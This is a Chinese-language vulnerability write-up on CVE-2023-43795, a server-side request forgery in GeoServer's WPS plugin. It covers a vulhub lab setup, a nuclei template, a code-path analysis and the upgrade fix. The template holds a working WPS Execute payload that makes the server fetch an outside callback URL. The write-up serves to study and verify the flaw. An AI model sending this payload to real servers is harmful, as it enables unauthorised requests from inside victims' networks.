<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="9f7e1f6def9f2f9be898b89883ff4490">0x00 概述</h1>
<p>GeoServer 是一个用 Java 编写的开源软件服务器，它可以让用户共享和编辑地理空间数据，GeoServer 遵循 OpenGIS Web 服务器规范，使用开放标准发布来自任何主要空间数据源的数据。经过分析，该软件存在ssrf漏洞，攻击者可以从服务端实现任意请求伪造。</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>值</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>漏洞编号</td>
<td>CVE-2023-43795</td>
<td></td>
</tr>
<tr>
<td>漏洞厂商</td>
<td>GeoServer</td>
<td></td>
</tr>
<tr>
<td>厂商官网</td>
<td><a href="https://geoserver.org/" target="_blank">https://geoserver.org/</a></td>
<td></td>
</tr>
<tr>
<td>影响对象类型</td>
<td>Web应用</td>
<td></td>
</tr>
<tr>
<td>影响产品</td>
<td>GeoServer</td>
<td></td>
</tr>
<tr>
<td>影响版本</td>
<td>version&lt;2.22.5,version &lt; 2.23.2</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h1 data-content="1" id="2aea4aebe6e16bf975552302b70fc57b">0x01 漏洞影响</h1>
<p><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-5pr3-m5hm-9956" target="_blank">https://github.com/geoserver/geoserver/security/advisories/GHSA-5pr3-m5hm-9956</a></p>
<ul>
<li>
<p>version&lt;2.22.5,version &lt; 2.23.2</p>
</li>
<li>
<p>需要安装 wps 插件</p>
</li>
</ul>
<h1 data-content="1" id="06d43428854045c7296c60dc7fe795bd">0x02 漏洞环境</h1>
<p>基于 <a href="https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2023-25157" target="_blank">https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2023-25157</a> 进行搭建，只是要安装wps插件</p>
<p>这里版本为2.22.1</p>
<p>安装对应版本的wps插件，下载：<a href="https://sourceforge.net/projects/geoserver/files/GeoServer/2.22.1/extensions/geoserver-2.22.1-wps-plugin.zip/download，下载完之后解压" target="_blank">https://sourceforge.net/projects/geoserver/files/GeoServer/2.22.1/extensions/geoserver-2.22.1-wps-plugin.zip/download，下载完之后解压</a></p>
<p>修改docker compose：</p>
<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">version</span><span class="p p-Indicator">:</span> <span class="s">'3'</span>
<span class="l l-Scalar l-Scalar-Plain">services</span><span class="p p-Indicator">:</span>
 <span class="l l-Scalar l-Scalar-Plain">web</span><span class="p p-Indicator">:</span>
   <span class="l l-Scalar l-Scalar-Plain">image</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">vulhub/geoserver:2.22.1</span>
   <span class="l l-Scalar l-Scalar-Plain">depends_on</span><span class="p p-Indicator">:</span>
    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">postgres</span>
   <span class="l l-Scalar l-Scalar-Plain">ports</span><span class="p p-Indicator">:</span>
    <span class="p p-Indicator">-</span> <span class="s">"8080:8080"</span>
    <span class="p p-Indicator">-</span> <span class="s">"5005:5005"</span>
   <span class="l l-Scalar l-Scalar-Plain">volumes</span><span class="p p-Indicator">:</span>
     <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">./startup.sh:/startup.sh</span>
     <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">./startup2.sh:/mnt/geoserver/bin/startup.sh</span>
     <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">./gs-web-wps-2.22.1.jar:/mnt/geoserver/webapps/geoserver/WEB-INF/lib/gs-web-wps-2.22.1.jar</span>
     <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">./gs-wps-core-2.22.1.jar:/mnt/geoserver/webapps/geoserver/WEB-INF/lib/gs-wps-core-2.22.1.jar</span>
     <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">./gs-wps-kml-ppio-2.22.1.jar:/mnt/geoserver/webapps/geoserver/WEB-INF/lib/gs-wps-kml-ppio-2.22.1.jar</span>
     <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">./gt-csv-28.1.jar:/mnt/geoserver/webapps/geoserver/WEB-INF/lib/gt-csv-28.1.jar</span>
     <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">./gt-process-geometry-28.1.jar:/mnt/geoserver/webapps/geoserver/WEB-INF/lib/gt-process-geometry-28.1.jar</span>
     <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">./gt-xsd-kml-28.1.jar:/mnt/geoserver/webapps/geoserver/WEB-INF/lib/gt-xsd-kml-28.1.jar</span>
     <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">./gt-xsd-wps-28.1.jar:/mnt/geoserver/webapps/geoserver/WEB-INF/lib/gt-xsd-wps-28.1.jar</span>
     <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">./net.opengis.wps-28.1.jar:/mnt/geoserver/webapps/geoserver/WEB-INF/lib/net.opengis.wps-28.1.jar</span>
     <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">./opencsv-5.0.jar:/mnt/geoserver/webapps/geoserver/WEB-INF/lib/opencsv-5.0.jar</span>
     <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">./serializer-2.7.2.jar:/mnt/geoserver/webapps/geoserver/WEB-INF/lib/serializer-2.7.2.jar</span>
   <span class="l l-Scalar l-Scalar-Plain">command</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">bash /startup.sh</span>
 <span class="l l-Scalar l-Scalar-Plain">postgres</span><span class="p p-Indicator">:</span>
   <span class="l l-Scalar l-Scalar-Plain">image</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">postgis/postgis:14-3.3-alpine</span>
   <span class="l l-Scalar l-Scalar-Plain">environment</span><span class="p p-Indicator">:</span> 
    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">POSTGRES_PASSWORD=vulhub</span>
    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">POSTGRES_DB=geoserver</span>
</pre></div>
<p>如果要调试的话，修改一下容器中的 <code>/mnt/geoserver/bin/startup.sh</code> 文件：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231124001330-3dc411d4-8a1b-1.png"/></p>
<pre><code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005</code></pre>
<h1 data-content="1" id="3360dd3c8964e27e9c7a49dc28ddf326">0x03 漏洞验证和利用</h1>
<p>运行nuclei：</p>
<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">id</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">CVE-2023-43795</span>

<span class="l l-Scalar l-Scalar-Plain">info</span><span class="p p-Indicator">:</span>
  <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">GeoServer WPS - Server Side Request Forgery</span>
  <span class="l l-Scalar l-Scalar-Plain">author</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">DhiyaneshDK</span>
  <span class="l l-Scalar l-Scalar-Plain">severity</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">critical</span>
  <span class="l l-Scalar l-Scalar-Plain">description</span><span class="p p-Indicator">:</span> <span class="p p-Indicator">|</span>
    <span class="no">GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. The OGC Web Processing Service (WPS) specification is designed to process information from any server using GET and POST requests. This presents the opportunity for Server Side Request Forgery. This vulnerability has been patched in version 2.22.5 and 2.23.2.</span>
<span class="l l-Scalar l-Scalar-Plain">variables</span><span class="p p-Indicator">:</span>
  <span class="l l-Scalar l-Scalar-Plain">string</span><span class="p p-Indicator">:</span> <span class="s">"{{to_lower(rand_text_alpha(4))}}"</span>
  <span class="l l-Scalar l-Scalar-Plain">value</span><span class="p p-Indicator">:</span> <span class="s">"{{to_lower(rand_text_alpha(5))}}"</span>

<span class="l l-Scalar l-Scalar-Plain">http</span><span class="p p-Indicator">:</span>
  <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">raw</span><span class="p p-Indicator">:</span>
      <span class="p p-Indicator">-</span> <span class="p p-Indicator">|</span>
        <span class="no">POST {{path}} HTTP/1.1</span>
        <span class="no">Host: {{Hostname}}</span>
        <span class="no">Content-Type: application/xml</span>

        <span class="no">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
        <span class="no">&lt;wps:Execute version="1.0.0" service="WPS"</span>
          <span class="no">xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</span>
          <span class="no">xmlns="http://www.opengis.net/wps/1.0.0"</span>
          <span class="no">xmlns:wfs="http://www.opengis.net/wfs"</span>
          <span class="no">xmlns:wps="http://www.opengis.net/wps/1.0.0"</span>
          <span class="no">xmlns:ows="http://www.opengis.net/ows/1.1"</span>
          <span class="no">xmlns:gml="http://www.opengis.net/gml"</span>
          <span class="no">xmlns:ogc="http://www.opengis.net/ogc"</span>
          <span class="no">xmlns:wcs="http://www.opengis.net/wcs/1.1.1"</span>
          <span class="no">xmlns:xlink="http://www.w3.org/1999/xlink"</span>
                <span class="no">xsi:schemaLocation="http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd"&gt;</span>
          <span class="no">&lt;ows:Identifier&gt;JTS:area&lt;/ows:Identifier&gt;</span>
          <span class="no">&lt;wps:DataInputs&gt;</span>
            <span class="no">&lt;wps:Input&gt;</span>
              <span class="no">&lt;ows:Identifier&gt;geom&lt;/ows:Identifier&gt;</span>
              <span class="no">&lt;wps:Reference mimeType="application/json" xlink:href="http://{{interactsh-url}}" method="GET"&gt;</span>
                <span class="no">&lt;wps:Header key="{{string}}" value="{{value}}"/&gt;</span>
              <span class="no">&lt;/wps:Reference&gt;</span>
            <span class="no">&lt;/wps:Input&gt;</span>
          <span class="no">&lt;/wps:DataInputs&gt;</span>
          <span class="no">&lt;wps:ResponseForm&gt;</span>
            <span class="no">&lt;wps:RawDataOutput&gt;</span>
              <span class="no">&lt;ows:Identifier&gt;result&lt;/ows:Identifier&gt;</span>
            <span class="no">&lt;/wps:RawDataOutput&gt;</span>
          <span class="no">&lt;/wps:ResponseForm&gt;</span>
        <span class="no">&lt;/wps:Execute&gt;</span>

    <span class="l l-Scalar l-Scalar-Plain">payloads</span><span class="p p-Indicator">:</span>
      <span class="l l-Scalar l-Scalar-Plain">path</span><span class="p p-Indicator">:</span>
        <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">/wms</span>
        <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">/geoserver/wms</span>

    <span class="l l-Scalar l-Scalar-Plain">stop-at-first-match</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">true</span>
    <span class="l l-Scalar l-Scalar-Plain">matchers</span><span class="p p-Indicator">:</span>
      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">type</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">dsl</span>
        <span class="l l-Scalar l-Scalar-Plain">dsl</span><span class="p p-Indicator">:</span>
          <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">contains(interactsh_protocol, 'http')</span>
          <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">contains_all(to_lower(interactsh_request), '{{string}}','{{value}}')</span>
          <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">status_code == 200</span>
        <span class="l l-Scalar l-Scalar-Plain">condition</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">and</span>
</pre></div>
<div class="highlight"><pre><span></span>nuclei.exe -t CVE-2023-43795.yaml -u http://192.168.88.132:8080/
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231124001342-45562a0e-8a1b-1.png"/></p>
<h1 data-content="1" id="73d2d5abc5f33f28a2a6a4bf59588850">0x04 漏洞分析</h1>
<p>访问 <code>/geoserver/wms</code> ，在<code>org.geoserver.ows.Dispatcher</code> 的 <code>service()</code> 中，会调用 <code>this.findService()</code> 确定要调用的service：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231124001412-56da9076-8a1b-1.png"/></p>
<p>调用 <code>this.execute()</code> ：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231124001421-5cb628c0-8a1b-1.png"/></p>
<p>来到 <code>org.geoserver.wps.DefaultWebProcessingService</code> 的 <code>execute()</code> ：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231124001430-61ddfb20-8a1b-1.png"/></p>
<p>跟进由一个 <code>executionManager</code> 负责处理 request ：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231124001438-66bf4b26-8a1b-1.png"/></p>
<p>最终调用一个 <code>WPSExecutionManager$Executor</code> 对象的 <code>call()</code> ：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231124001446-6b5e0e74-8a1b-1.png"/></p>
<p>最终触发 <code>org.apache.http.impl.client.CloseableHttpClient.execute()</code> 实现ssrf：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231124001453-6f813512-8a1b-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231124001459-733248c2-8a1b-1.png"/></p>
<h1 data-content="1" id="03a76e5f2cf06ded9f9a2101cb61bc81">0x05 漏洞修复</h1>
<p>更新版本到 &gt;=2.22.5 ，或更新版本&gt;= 2.23.2</p>
</div>
</div>